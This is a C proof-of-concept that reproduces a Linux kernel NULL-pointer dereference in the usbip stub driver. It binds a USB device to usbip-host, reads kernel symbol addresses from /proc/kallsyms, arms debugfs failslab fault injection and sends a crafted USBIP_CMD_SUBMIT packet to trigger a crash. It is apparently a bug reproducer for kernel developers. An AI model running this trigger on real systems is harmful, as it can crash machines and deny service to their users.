// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <stdint.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>

static int wr(const char *path, const char *val)
{
	int fd, n;

	fd = open(path, O_WRONLY);
	if (fd < 0) {
		printf("[-] open(%s) failed: %s\n", path, strerror(errno));
		return -1;
	}
	n = write(fd, val, strlen(val));
	if (n < 0)
		printf("[-] write(%s, \"%s\") failed: %s\n", path, val, strerror(errno));
	else
		printf("[+] %s <- \"%s\"\n", path, val);
	close(fd);
	return n < 0 ? -1 : 0;
}

static int rd(const char *path, char *buf, size_t len)
{
	int fd, n;

	fd = open(path, O_RDONLY);
	if (fd < 0)
		return -1;
	n = read(fd, buf, len - 1);
	close(fd);
	if (n < 0)
		return -1;
	buf[n] = 0;
	while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == ' '))
		buf[--n] = 0;
	return 0;
}

struct symrange { unsigned long start, end; };

#ifndef STUB_URBS_KMALLOC_RET_OFF
#define STUB_URBS_KMALLOC_RET_OFF 0UL
#endif

static int kallsyms_range(const char *const *names, int nnames,
			  struct symrange *out)
{
	FILE *f;
	char line[512];
	unsigned long addr, prev = 0;
	char type, name[256];
	int hit = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f) {
		printf("[-] cannot open /proc/kallsyms\n");
		return -1;
	}
	while (fgets(line, sizeof(line), f)) {
		if (sscanf(line, "%lx %c %255s", &addr, &type, name) != 3)
			continue;
		if (hit) {

			if (addr > out->start) {
				out->end = addr;
				fclose(f);
				return 0;
			}
			continue;
		}
		for (int i = 0; i < nnames; i++) {
			size_t l = strlen(names[i]);
			if (!strncmp(name, names[i], l) &&
			    (name[l] == 0 || name[l] == '.')) {
				out->start = addr;
				hit = 1;
				break;
			}
		}
		prev = addr;
	}
	fclose(f);
	(void)prev;
	if (hit) {
		out->end = out->start + 0x1000;
		return 0;
	}
	return -1;
}

static char busid[64];
static int busnum, devnum;

static int find_gadget(void)
{
	DIR *d;
	struct dirent *e;
	char path[512], vid[64], pid[64];
	int best = 0;

	d = opendir("/sys/bus/usb/devices");
	if (!d) {
		printf("[-] no /sys/bus/usb/devices\n");
		return -1;
	}
	while ((e = readdir(d))) {
		if (e->d_name[0] == '.')
			continue;
		if (strchr(e->d_name, ':'))
			continue;
		if (!strncmp(e->d_name, "usb", 3))
			continue;
		snprintf(path, sizeof(path), "/sys/bus/usb/devices/%s/idVendor", e->d_name);
		if (rd(path, vid, sizeof(vid)) < 0)
			continue;
		snprintf(path, sizeof(path), "/sys/bus/usb/devices/%s/idProduct", e->d_name);
		if (rd(path, pid, sizeof(pid)) < 0)
			continue;
		printf("[*] usb device %s  %s:%s\n", e->d_name, vid, pid);

		if (!best || (!strcmp(vid, "0525") && !strcmp(pid, "a4a0"))) {
			snprintf(busid, sizeof(busid), "%s", e->d_name);
			best = 1;
		}
	}
	closedir(d);
	if (!best) {
		printf("[-] no usb device found\n");
		return -1;
	}
	snprintf(path, sizeof(path), "/sys/bus/usb/devices/%s/busnum", busid);
	if (rd(path, vid, sizeof(vid)) < 0)
		return -1;
	busnum = atoi(vid);
	snprintf(path, sizeof(path), "/sys/bus/usb/devices/%s/devnum", busid);
	if (rd(path, vid, sizeof(vid)) < 0)
		return -1;
	devnum = atoi(vid);
	printf("[+] using busid=%s busnum=%d devnum=%d\n", busid, busnum, devnum);
	return 0;
}

static void unbind_interfaces(void)
{
	DIR *d;
	struct dirent *e;
	char path[512], drv[512], *base;
	ssize_t n;

	d = opendir("/sys/bus/usb/devices");
	if (!d)
		return;
	while ((e = readdir(d))) {
		if (strncmp(e->d_name, busid, strlen(busid)))
			continue;
		if (!strchr(e->d_name, ':'))
			continue;
		snprintf(path, sizeof(path), "/sys/bus/usb/devices/%s/driver", e->d_name);
		n = readlink(path, drv, sizeof(drv) - 1);
		if (n <= 0)
			continue;
		drv[n] = 0;
		base = strrchr(drv, '/');
		base = base ? base + 1 : drv;
		snprintf(path, sizeof(path), "/sys/bus/usb/drivers/%s/unbind", base);
		wr(path, e->d_name);
	}
	closedir(d);
}

struct usbip_pdu {
	uint32_t command;
	uint32_t seqnum;
	uint32_t devid;
	uint32_t direction;
	uint32_t ep;
	uint32_t transfer_flags;
	int32_t  transfer_buffer_length;
	int32_t  start_frame;
	int32_t  number_of_packets;
	int32_t  interval;
	unsigned char setup[8];
} __attribute__((packed));

static uint32_t be32(uint32_t v)
{
	return ((v & 0xffu) << 24) | ((v & 0xff00u) << 8) |
	       ((v >> 8) & 0xff00u) | ((v >> 24) & 0xffu);
}

int main(void)
{
	char path[512], val[128];
	struct symrange target, reject;
	static const char *tn0[] = { "stub_recv_cmd_submit" };
	static const char *tn1[] = { "stub_rx_pdu" };
	static const char *tn2[] = { "stub_rx_loop" };
	struct symrange loop;
	unsigned long site = 0;
	static const char *rnames[] = { "kmem_cache_alloc_noprof" };
	struct usbip_pdu pdu;
	int sv[2];
	int i;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== usbip stub_recv_cmd_submit err_urbs NULL-deref PoC ===\n");

	mount("none", "/sys/kernel/debug", "debugfs", 0, NULL);
	wr("/proc/sys/kernel/kptr_restrict", "0");

	if (access("/sys/bus/usb/drivers/usbip-host", F_OK) < 0) {
		printf("[-] usbip-host driver not present (CONFIG_USBIP_HOST)\n");
		return 1;
	}

	for (i = 0; i < 100; i++) {
		if (find_gadget() == 0)
			break;
		usleep(100000);
	}
	if (i == 100)
		return 1;

	unbind_interfaces();
	snprintf(val, sizeof(val), "add %s", busid);
	wr("/sys/bus/usb/drivers/usbip-host/match_busid", val);
	wr("/sys/bus/usb/drivers/usb/unbind", busid);
	wr("/sys/bus/usb/drivers/usbip-host/bind", busid);

	snprintf(path, sizeof(path), "/sys/bus/usb/devices/%s/usbip_sockfd", busid);
	if (access(path, F_OK) < 0) {
		printf("[-] %s not present - stub bind failed\n", path);
		return 1;
	}
	printf("[+] stub driver bound, %s present\n", path);

	if (STUB_URBS_KMALLOC_RET_OFF &&
	    kallsyms_range(tn2, 1, &loop) == 0 &&
	    loop.start + STUB_URBS_KMALLOC_RET_OFF < loop.end) {
		site = loop.start + STUB_URBS_KMALLOC_RET_OFF;
		target.start = site;
		target.end = site + 1;
		reject.start = 0;
		reject.end = 0;
		printf("[+] stub_rx_loop=%lx, urbs-kmalloc ret site=%lx\n",
		       loop.start, site);
	} else if (kallsyms_range(tn0, 1, &target) == 0 ||
		   kallsyms_range(tn1, 1, &target) == 0 ||
		   kallsyms_range(tn2, 1, &target) == 0) {
		if (kallsyms_range(rnames, 1, &reject) < 0) {
			printf("[-] cannot locate kmem_cache_alloc_noprof\n");
			return 1;
		}
		printf("[!] falling back to coarse stack window\n");
	} else {
		printf("[-] cannot locate the usbip rx path in kallsyms\n");
		return 1;
	}
	printf("[+] require window [%lx, %lx)\n", target.start, target.end);
	printf("[+] reject  window [%lx, %lx)\n", reject.start, reject.end);

#define FS "/sys/kernel/debug/failslab/"
	if (access(FS "probability", F_OK) < 0) {
		printf("[-] failslab debugfs missing\n");
		return 1;
	}
	wr(FS "probability", "0");
	wr(FS "interval", "1");
	wr(FS "times", "1");
	wr(FS "space", "0");
	wr(FS "verbose", "2");
	wr(FS "task-filter", "N");
	wr(FS "ignore-gfp-wait", "N");
	wr(FS "cache-filter", "N");
	wr(FS "stacktrace-depth", "16");
	snprintf(val, sizeof(val), "0x%lx", target.start);
	wr(FS "require-start", val);
	snprintf(val, sizeof(val), "0x%lx", target.end);
	wr(FS "require-end", val);
	snprintf(val, sizeof(val), "0x%lx", reject.start);
	wr(FS "reject-start", val);
	snprintf(val, sizeof(val), "0x%lx", reject.end);
	wr(FS "reject-end", val);

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
		printf("[-] socketpair: %s\n", strerror(errno));
		return 1;
	}
	snprintf(val, sizeof(val), "%d", sv[0]);
	if (wr(path, val) < 0) {
		printf("[-] usbip_sockfd store failed\n");
		return 1;
	}
	usleep(200000);

	memset(&pdu, 0, sizeof(pdu));
	pdu.command   = be32(1);
	pdu.seqnum    = be32(1);
	pdu.devid     = be32((busnum << 16) | devnum);
	pdu.direction = be32(0);
	pdu.ep        = be32(0);
	pdu.transfer_flags = be32(0);
	pdu.transfer_buffer_length = 0;

	printf("[*] arming failslab and sending USBIP_CMD_SUBMIT (devid %08x)\n",
	       (busnum << 16) | devnum);
	wr(FS "probability", "100");
	if (write(sv[1], &pdu, sizeof(pdu)) != sizeof(pdu))
		printf("[-] pdu write: %s\n", strerror(errno));

	for (i = 0; i < 60; i++) {
		sleep(1);
		char t[32];
		if (rd(FS "times", t, sizeof(t)) == 0 && !strcmp(t, "0")) {
			printf("[+] failslab fired (times=0), waiting for oops\n");
			break;
		}
	}
	sleep(10);
	wr(FS "probability", "0");
	printf("[-] no crash observed\n");
	return 0;
}
